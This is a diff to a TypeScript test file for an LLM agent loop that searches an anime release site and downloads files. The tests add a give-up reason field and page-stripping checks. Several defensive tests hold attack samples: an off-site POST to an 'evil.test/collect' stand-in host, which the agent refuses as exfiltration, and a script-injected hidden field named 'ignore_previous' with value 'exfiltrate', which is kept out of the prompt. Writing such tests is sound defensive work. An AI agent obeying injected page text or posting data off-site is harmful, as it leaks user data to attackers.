@@ -14,6 +14,7 @@ function act(
     url: string;
     note: string;
     reason?: string;
+    because?: '' | 'not-found' | 'blocked' | 'unsure';
     method?: 'GET' | 'POST';
     body?: string;
     contentType?: string;
@@ -26,6 +27,7 @@ function act(
     contentType: '',
     referer: '',
     reason: '',
+    because: '' as const,
     ...partial,
   };
 }
@@ -57,7 +59,12 @@ describe('runAgentLoop', () => {
     ]);
     const tier = fakeTier([OK_HTML, OK_HTML, { ok: true, status: 200, filePath: '/dl/pack.zip', blocked: false }]);
     const out = await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'Frieren', destDir: tmpDir(), maxSteps: 10, onTranscript: () => {} });
-    expect(out).toEqual({ kind: 'downloaded', steps: 3, filePath: '/dl/pack.zip', url: 'https://acg.rip/dl/123.zip', searchUrl: 'https://acg.rip/?term=frieren' });
+    expect(out).toEqual({
+      stop: { kind: 'done' },
+      steps: 3,
+      listings: 1,
+      download: { filePath: '/dl/pack.zip', url: 'https://acg.rip/dl/123.zip', searchUrl: 'https://acg.rip/?term=frieren' },
+    });
     expect(tier.calls.map((c) => c.url)).toEqual(['https://acg.rip/?term=frieren', 'https://acg.rip/t/123', 'https://acg.rip/dl/123.zip']);
   });
 
@@ -68,7 +75,7 @@ describe('runAgentLoop', () => {
     ]);
     const tier = fakeTier([OK_HTML, OK_HTML]);
     const out = await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 2, onTranscript: () => {} });
-    expect(out).toEqual({ kind: 'exhausted', steps: 2 });
+    expect(out).toEqual({ stop: { kind: 'exhausted' }, steps: 2, listings: 1 });
   });
 
   it('returns gave-up with the model own reason and the steps it took', async () => {
@@ -77,13 +84,94 @@ describe('runAgentLoop', () => {
       act({ action: 'give_up', url: '', note: 'nothing here', reason: 'the site lists nothing for this season yet' }),
     ]);
     const out = await runAgentLoop({ llm, tier: fakeTier([OK_HTML]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
-    expect(out).toEqual({ kind: 'gave-up', steps: 2, reason: 'the site lists nothing for this season yet' });
+    expect(out).toEqual({
+      stop: { kind: 'gave-up', because: 'unsure', reason: 'the site lists nothing for this season yet' },
+      steps: 2,
+      listings: 1,
+    });
   });
 
   it('falls back to a stated-nothing reason when give_up carries no sentence', async () => {
     const llm = new FakeGenerator([act({ action: 'give_up', url: '', note: 'nothing here' })]);
     const out = await runAgentLoop({ llm, tier: fakeTier([]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
-    expect(out).toEqual({ kind: 'gave-up', steps: 1, reason: 'no reason given' });
+    expect(out).toEqual({ stop: { kind: 'gave-up', because: 'unsure', reason: 'no reason given' }, steps: 1, listings: 0 });
+  });
+
+  it.each(['not-found', 'blocked', 'unsure'] as const)('carries a give_up because=%s through to the stop', async (because) => {
+    const llm = new FakeGenerator([act({ action: 'give_up', url: '', note: 'stopping', reason: 'r', because })]);
+    const out = await runAgentLoop({ llm, tier: fakeTier([]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+    expect(out.stop).toEqual({ kind: 'gave-up', because, reason: 'r' });
+  });
+
+  /** Every other field uses `''` for "not applicable", so a model that has read the schema
+   * writes `because: ''` on the four actions that are not a give-up. Rejecting that turned a
+   * correct reply into a malformed one, three in a row, on a live run. */
+  it('accepts a non-give_up action with the empty because sentinel', () => {
+    expect(
+      AgentActionSchema.parse({
+        action: 'open',
+        url: 'https://acg.rip/t/1',
+        note: 'opening',
+        method: 'GET',
+        body: '',
+        contentType: '',
+        referer: '',
+        reason: '',
+        because: '',
+      }),
+    ).toMatchObject({ action: 'open', because: '' });
+  });
+
+  it('reads a give_up with an empty because as unsure', async () => {
+    const llm = new FakeGenerator([act({ action: 'give_up', url: '', note: 'stopping', reason: 'r', because: '' })]);
+    const out = await runAgentLoop({ llm, tier: fakeTier([]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+    expect(out.stop).toEqual({ kind: 'gave-up', because: 'unsure', reason: 'r' });
+  });
+
+  it('spells out what each give_up because means', async () => {
+    const llm = new FakeGenerator([act({ action: 'give_up', url: '', note: 'nope' })]);
+    await runAgentLoop({ llm, tier: fakeTier([]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 1, onTranscript: () => {} });
+    const system = llm.calls[0]!.system!;
+    expect(system).toContain('- not-found: you searched and the site has nothing for these episodes');
+    expect(system).toContain('- blocked: you could not get through');
+    expect(system).toContain('- unsure: you could not tell');
+  });
+
+  /** The evidence behind a `not-found`: two searches that came back with the SAME page are
+   * one look, and the ladder is not allowed to read them as two. */
+  it.each([
+    ['two different result pages', '<html>results for a</html>', '<html>results for b</html>', 2],
+    ['the same result page twice', '<html>results</html>', '<html>results</html>', 1],
+    ['the same page under different markup', '<html><b>results</b></html>', '<html><i>results</i></html>', 1],
+    // An empty result shell whose only moving part is a footer: same look, twice.
+    [
+      'the same empty shell under a different generation footer',
+      '<html>No results found<footer>generated in 0.031s — request 4f2a1c9de77b0a3155ee42bc9018d7f6</footer></html>',
+      '<html>No results found<footer>generated in 0.107s — request 91bb0e4a7c2d1f38aa5560e3d4491c72</footer></html>',
+      1,
+    ],
+  ])('counts %s as %s listing(s)', async (_name, first, second, expected) => {
+    const llm = new FakeGenerator([
+      act({ action: 'search', url: 'https://acg.rip/?term=a', note: 's' }),
+      act({ action: 'search', url: 'https://acg.rip/?term=b', note: 's' }),
+      act({ action: 'give_up', url: '', note: 'done', because: 'not-found' }),
+    ]);
+    const tier = fakeTier([
+      { ok: true, status: 200, body: first, blocked: false },
+      { ok: true, status: 200, body: second, blocked: false },
+    ]);
+    const out = await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+    expect(out.listings).toBe(expected);
+  });
+
+  it('counts no listing for a search that failed', async () => {
+    const llm = new FakeGenerator([
+      act({ action: 'search', url: 'https://acg.rip/?term=a', note: 's' }),
+      act({ action: 'give_up', url: '', note: 'done', because: 'not-found' }),
+    ]);
+    const tier = fakeTier([{ ok: false, status: 503, body: 'nope', blocked: false }]);
+    const out = await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+    expect(out.listings).toBe(0);
   });
 
   it('throws TierBlockedError when the tier reports a bot wall', async () => {
@@ -131,7 +219,7 @@ describe('runAgentLoop', () => {
       },
     });
     const secondPrompt = llm.calls[1]!.prompt;
-    expect(secondPrompt).toContain('request POST https://acg.rip/api/dl -> OK:');
+    expect(secondPrompt).toContain('request POST https://acg.rip/api/dl — protocol step -> OK:');
     expect(secondPrompt).toContain('{"url":"https://cdn/x.zip"}');
   });
 
@@ -168,7 +256,7 @@ describe('runAgentLoop', () => {
     await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
     const secondPrompt = llm.calls[1]!.prompt;
     expect(secondPrompt).toContain(
-      'request GET https://acg.rip/down/uE7Rx2 -> HTTP 403: Download page expired Go back to the detail page and download again.',
+      'request GET https://acg.rip/down/uE7Rx2 — protocol step -> HTTP 403: Download page expired Go back to the detail page and download again.',
     );
     expect(secondPrompt).not.toContain('<title>');
     expect(secondPrompt).not.toContain('<p>');
@@ -184,7 +272,7 @@ describe('runAgentLoop', () => {
     ]);
     await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
     const secondPrompt = llm.calls[1]!.prompt;
-    expect(secondPrompt).toContain('open https://acg.rip/t/123 -> HTTP 403: Session expired, please sign in.');
+    expect(secondPrompt).toContain('open https://acg.rip/t/123 — opening -> HTTP 403: Session expired, please sign in.');
     expect(secondPrompt).not.toContain('<div');
   });
 
@@ -196,7 +284,7 @@ describe('runAgentLoop', () => {
     const tier = fakeTier([{ ok: false, status: 403, body: '', blocked: false }]);
     await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
     const secondPrompt = llm.calls[1]!.prompt;
-    expect(secondPrompt).toContain('open https://acg.rip/t/123 -> HTTP 403');
+    expect(secondPrompt).toContain('open https://acg.rip/t/123 — opening -> HTTP 403');
     expect(secondPrompt).not.toContain('HTTP 403:');
   });
 
@@ -210,6 +298,31 @@ describe('runAgentLoop', () => {
     expect(tier.calls).toHaveLength(0);
     const secondPrompt = llm.calls[1]!.prompt;
     expect(secondPrompt).toContain('request refused: https://evil.test/admin is not on acg.rip');
+  });
+
+  /** A POST is a POST whichever verb carries it: page text that talks the agent into
+   * posting a form off-site is the same exfiltration whether it calls the step `request`
+   * or `search`. GET search stays open — it legitimately reaches mirrors. */
+  it('refuses an off-site POST search without fetching', async () => {
+    const llm = new FakeGenerator([
+      act({ action: 'search', url: 'https://evil.test/collect', note: 'posting the form', method: 'POST', body: 'q=frieren' }),
+      act({ action: 'give_up', url: '', note: 'stopped' }),
+    ]);
+    const tier = fakeTier([{ ok: true, status: 200, body: 'should-not-see', blocked: false }]);
+    const out = await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+    expect(tier.calls).toHaveLength(0);
+    expect(out.listings).toBe(0);
+    expect(llm.calls[1]!.prompt).toContain('search refused: https://evil.test/collect is not on acg.rip');
+  });
+
+  it('still allows an off-site GET search', async () => {
+    const llm = new FakeGenerator([
+      act({ action: 'search', url: 'https://mirror.example.test/?q=frieren', note: 'mirror search' }),
+      act({ action: 'give_up', url: '', note: 'done' }),
+    ]);
+    const tier = fakeTier([{ ok: true, status: 200, body: '<html>results</html>', blocked: false }]);
+    await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+    expect(tier.calls).toHaveLength(1);
   });
 
   it.each([
@@ -294,7 +407,7 @@ describe('runAgentLoop', () => {
     const llm = new FakeGenerator([act({ action, url, note: 'probe' }), act({ action: 'give_up', url: '', note: 'stopped' })]);
     const tier = fakeTier([{ ok: true, status: 200, body: 'should-not-see', filePath: '/dl/x', blocked: false }]);
     const out = await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
-    expect(out).toMatchObject({ kind: 'gave-up', steps: 2 });
+    expect(out).toMatchObject({ stop: { kind: 'gave-up' }, steps: 2 });
     expect(tier.calls).toHaveLength(0);
     expect(llm.calls[1]!.prompt).toContain(`${action} refused: ${url} targets a private/loopback address`);
   });
@@ -356,7 +469,7 @@ describe('runAgentLoop', () => {
       const tier = fakeTier([{ ok: false, blocked: false, refusedUrl }]);
       const entries: TranscriptEntry[] = [];
       const out = await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: (e) => entries.push(e) });
-      expect(out).toMatchObject({ kind: 'gave-up', steps: 2 });
+      expect(out).toMatchObject({ stop: { kind: 'gave-up' }, steps: 2 });
       const refusal = entries.find((e) => e.action === 'refused');
       expect(refusal?.level).toBe('attention');
       expect(refusal?.detail).toBe(
@@ -378,7 +491,7 @@ describe('runAgentLoop', () => {
     );
     const entries: TranscriptEntry[] = [];
     const out = await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 4, onTranscript: (e) => entries.push(e) });
-    expect(out).toEqual({ kind: 'exhausted', steps: 4 });
+    expect(out).toEqual({ stop: { kind: 'exhausted' }, steps: 4, listings: 0 });
     const refusals = entries.filter((e) => e.action === 'refused');
     expect(refusals).toHaveLength(4);
     expect(refusals[0]!.level).toBeUndefined();
@@ -408,7 +521,7 @@ describe('runAgentLoop', () => {
     );
     const tier = fakeTier(new Array(5).fill(null).map(() => ({ ok: false, blocked: false, refusedUrl: 'http://[::1]/x' })));
     const out = await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 20, onTranscript: () => {} });
-    expect(out).toEqual({ kind: 'refused-repeatedly', refusals: 3, steps: 3 });
+    expect(out).toEqual({ stop: { kind: 'refused', refusals: 3 }, steps: 3, listings: 0 });
   });
 
   it('passes referer on download to the tier', async () => {
@@ -422,7 +535,7 @@ describe('runAgentLoop', () => {
     ]);
     const tier = fakeTier([{ ok: true, status: 200, filePath: '/dl/pack.zip', blocked: false }]);
     const out = await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
-    expect(out.kind).toBe('downloaded');
+    expect(out.download?.filePath).toBe('/dl/pack.zip');
     expect(tier.calls[0]!.opts).toMatchObject({ destPath: expect.any(String), referer: 'https://acg.rip/t/123' });
   });
 
@@ -468,7 +581,7 @@ describe('runAgentLoop', () => {
     );
     const tier = fakeTier([]);
     const out = await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 20, onTranscript: () => {} });
-    expect(out).toEqual({ kind: 'refused-repeatedly', refusals: 3, steps: 3 });
+    expect(out).toEqual({ stop: { kind: 'refused', refusals: 3 }, steps: 3, listings: 0 });
     expect(llm.calls).toHaveLength(3);
   });
 
@@ -482,7 +595,7 @@ describe('runAgentLoop', () => {
     const llm = new FakeGenerator(new Array(6).fill(null).map(() => action));
     const entries: TranscriptEntry[] = [];
     const out = await runAgentLoop({ llm, tier: fakeTier([]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 6, onTranscript: (e) => entries.push(e) });
-    expect(out).toEqual({ kind: 'exhausted', steps: 6 });
+    expect(out).toEqual({ stop: { kind: 'exhausted' }, steps: 6, listings: 0 });
     // Every step still refused, and every refusal still reached the transcript.
     expect(entries.filter((e) => e.action === 'refused')).toHaveLength(6);
   });
@@ -491,7 +604,7 @@ describe('runAgentLoop', () => {
     const llm = new FakeGenerator([act({ action: 'give_up', url: '', note: 'nope' })]);
     await runAgentLoop({ llm, tier: fakeTier([]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 1, onTranscript: () => {} });
     expect(llm.calls[0]!.system).toContain(
-      'When every missing episode aired within the last 7 days and the site shows nothing for them, give_up: subtitles for a fresh episode usually do not exist yet, and the next scheduled run will look again.',
+      'When every missing episode aired within the last 7 days and the site shows nothing for them, give_up with because=not-found: subtitles for a fresh episode usually do not exist yet, and the next scheduled run will look again.',
     );
   });
 
@@ -504,6 +617,142 @@ describe('runAgentLoop', () => {
     expect(system).toContain('Only download saves a file');
     expect(system).toContain('Cookies persist automatically');
     expect(system).toContain('Older observations in the transcript are elided');
+    expect(system).toContain('a link reads as [url] before its text');
+  });
+
+  it('keeps every step note on its own line, including the ones whose observation was elided', async () => {
+    const llm = new FakeGenerator([
+      act({ action: 'search', url: 'https://acg.rip/?term=x', note: 'candidate slug is /t/8891' }),
+      act({ action: 'open', url: 'https://acg.rip/t/8891', note: 'opening the batch page' }),
+      act({ action: 'give_up', url: '', note: 'done' }),
+    ]);
+    const tier = fakeTier([
+      { ok: true, status: 200, body: 'A'.repeat(3000), blocked: false },
+      { ok: true, status: 200, body: 'B'.repeat(3000), blocked: false },
+    ]);
+    await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+
+    const prompt = llm.calls[2]!.prompt;
+    expect(prompt).toContain('search https://acg.rip/?term=x — candidate slug is /t/8891 -> OK: ');
+    expect(prompt).toContain('open https://acg.rip/t/8891 — opening the batch page -> OK: ');
+    // The first step's page is elided, and its note is exactly what has to outlive it.
+    expect(prompt).toContain('…[elided]');
+  });
+
+  it('strips a successful page to text while keeping links and hidden form fields', async () => {
+    const body = [
+      '<html><head><style>.a{color:red}</style><script>var token="secret"</script></head><body>',
+      '<form action="/search.php" method="post">',
+      '<input type="hidden" name="formhash" value="a1b2c3">',
+      '<input type="hidden" name="searchsubmit" value="yes">',
+      '<input type="text" name="q" value="typed">',
+      '</form>',
+      '<a href="/t/8891" class="tracked">Frieren S01 batch</a>',
+      '</body></html>',
+    ].join('');
+    const llm = new FakeGenerator([
+      act({ action: 'search', url: 'https://acg.rip/?term=x', note: 's' }),
+      act({ action: 'give_up', url: '', note: 'done' }),
+    ]);
+    await runAgentLoop({ llm, tier: fakeTier([{ ok: true, status: 200, body, blocked: false }]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+
+    const prompt = llm.calls[1]!.prompt;
+    expect(prompt).toContain('[form: formhash=a1b2c3, searchsubmit=yes]');
+    expect(prompt).toContain('[/t/8891] Frieren S01 batch');
+    expect(prompt).toContain('[form /search.php post]');
+    // The bulk is gone: script and style contents, classes, and the tags themselves.
+    expect(prompt).not.toContain('secret');
+    expect(prompt).not.toContain('color:red');
+    expect(prompt).not.toContain('class=');
+    expect(prompt).not.toContain('<a ');
+  });
+
+  /** Attribute names are matched on a word boundary, and `-` is not a word character, so
+   * `data-action` used to answer for `action` and `data-name` for `name` — the shadow won
+   * whenever it came first in the tag. */
+  it('does not let a data- attribute shadow the one it ends with', async () => {
+    const body = [
+      '<form data-action="/analytics/track" data-method="beacon" action="/search.php" method="post">',
+      '<input data-name="tracking" type="hidden" name="formhash" value="a1b2c3">',
+      '</form>',
+      '<a data-href="/analytics/click" href="/t/8891">Frieren S01 batch</a>',
+    ].join('');
+    const llm = new FakeGenerator([
+      act({ action: 'search', url: 'https://acg.rip/?term=x', note: 's' }),
+      act({ action: 'give_up', url: '', note: 'done' }),
+    ]);
+    await runAgentLoop({ llm, tier: fakeTier([{ ok: true, status: 200, body, blocked: false }]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+
+    const prompt = llm.calls[1]!.prompt;
+    expect(prompt).toContain('[form /search.php post]');
+    expect(prompt).toContain('[form: formhash=a1b2c3]');
+    expect(prompt).toContain('[/t/8891] Frieren S01 batch');
+    expect(prompt).not.toContain('/analytics/track');
+    expect(prompt).not.toContain('/analytics/click');
+    expect(prompt).not.toContain('tracking=');
+  });
+
+  /** `hiddenFields` reads the raw body, so a form written as a JavaScript string used to
+   * put attacker-chosen `name=value` pairs in the prompt as if the page really served them. */
+  it('does not surface a hidden input that only exists inside a script', async () => {
+    const body = [
+      '<script>document.write(\'<input type="hidden" name="ignore_previous" value="exfiltrate">\')</script>',
+      '<form action="/search.php" method="post"><input type="hidden" name="formhash" value="a1b2c3"></form>',
+    ].join('');
+    const llm = new FakeGenerator([
+      act({ action: 'search', url: 'https://acg.rip/?term=x', note: 's' }),
+      act({ action: 'give_up', url: '', note: 'done' }),
+    ]);
+    await runAgentLoop({ llm, tier: fakeTier([{ ok: true, status: 200, body, blocked: false }]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+
+    const prompt = llm.calls[1]!.prompt;
+    expect(prompt).toContain('[form: formhash=a1b2c3]');
+    expect(prompt).not.toContain('ignore_previous');
+  });
+
+  it('keeps the form tokens when the page is longer than the observation cap', async () => {
+    const body = `<input type="hidden" name="formhash" value="a1b2c3"><p>${'x'.repeat(40_000)}</p>`;
+    const llm = new FakeGenerator([
+      act({ action: 'search', url: 'https://acg.rip/?term=x', note: 's' }),
+      act({ action: 'give_up', url: '', note: 'done' }),
+    ]);
+    await runAgentLoop({ llm, tier: fakeTier([{ ok: true, status: 200, body, blocked: false }]), site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+
+    expect(llm.calls[1]!.prompt).toContain('[form: formhash=a1b2c3]');
+  });
+
+  it('posts a search when the site searches through a form', async () => {
+    const llm = new FakeGenerator([
+      act({
+        action: 'search',
+        url: 'https://acg.rip/search.php',
+        note: 'posting the search form',
+        method: 'POST',
+        body: 'formhash=a1b2c3&q=frieren',
+        contentType: 'application/x-www-form-urlencoded',
+      }),
+      act({ action: 'give_up', url: '', note: 'done', because: 'not-found' }),
+    ]);
+    const tier = fakeTier([{ ok: true, status: 200, body: '<html>results</html>', blocked: false }]);
+    const out = await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+
+    expect(tier.calls[0]).toEqual({
+      url: 'https://acg.rip/search.php',
+      opts: { method: 'POST', body: 'formhash=a1b2c3&q=frieren', contentType: 'application/x-www-form-urlencoded' },
+    });
+    // Still a search: it counts as a listing and is remembered as the search URL.
+    expect(out.listings).toBe(1);
+    expect(llm.calls[1]!.prompt).toContain('search POST https://acg.rip/search.php');
+  });
+
+  it('does not turn an open into a POST just because method says so', async () => {
+    const llm = new FakeGenerator([
+      act({ action: 'open', url: 'https://acg.rip/t/1', note: 'visiting', method: 'POST', body: 'nope' }),
+      act({ action: 'give_up', url: '', note: 'done' }),
+    ]);
+    const tier = fakeTier([{ ok: true, status: 200, body: 'ok', blocked: false }]);
+    await runAgentLoop({ llm, tier, site: SITE, profile: PROFILE, knowledge: '', query: 'F', destDir: tmpDir(), maxSteps: 5, onTranscript: () => {} });
+    expect(tier.calls[0]!.opts).toEqual({});
   });
 
   it('elides older observations in the rendered prompt while keeping the latest full', async () => {
@@ -556,7 +805,7 @@ describe('runAgentLoop', () => {
       maxSteps: 10,
       onTranscript: (e) => transcript.push(e),
     });
-    expect(out).toEqual({ kind: 'gave-up', steps: 5, reason: 'nothing listed' });
+    expect(out).toEqual({ stop: { kind: 'gave-up', because: 'unsure', reason: 'nothing listed' }, steps: 5, listings: 1 });
     expect(transcript.filter((e) => e.action === 'malformed')).toHaveLength(3);
     // The correction rides in the next prompt, or the model has no idea what went wrong.
     const lastPrompt = llm.calls.at(-1)!.prompt;
@@ -576,7 +825,7 @@ describe('runAgentLoop', () => {
       maxSteps: 10,
       onTranscript: () => {},
     });
-    expect(out).toEqual({ kind: 'malformed-repeatedly', failures: 3, steps: 3 });
+    expect(out).toEqual({ stop: { kind: 'malformed', failures: 3 }, steps: 3, listings: 0 });
     // The fourth queued action was never asked for.
     expect(llm.calls).toHaveLength(3);
   });
@@ -601,7 +850,7 @@ describe('runAgentLoop', () => {
   it('strict-mode schema requires every action field (no optional)', () => {
     // Zod 4: optional fields wrap as ZodOptional; required sentinels must parse without defaults.
     const shape = AgentActionSchema.shape;
-    for (const key of ['action', 'url', 'note', 'method', 'body', 'contentType', 'referer', 'reason'] as const) {
+    for (const key of ['action', 'url', 'note', 'method', 'body', 'contentType', 'referer', 'reason', 'because'] as const) {
       expect(shape[key].isOptional()).toBe(false);
       expect(shape[key].def.type).not.toBe('optional');
     }
@@ -617,7 +866,8 @@ describe('runAgentLoop', () => {
         contentType: '',
         referer: '',
         reason: '',
+        because: 'not-found',
       }),
-    ).toMatchObject({ action: 'give_up', method: 'GET', body: '' });
+    ).toMatchObject({ action: 'give_up', method: 'GET', body: '', because: 'not-found' });
   });
 });
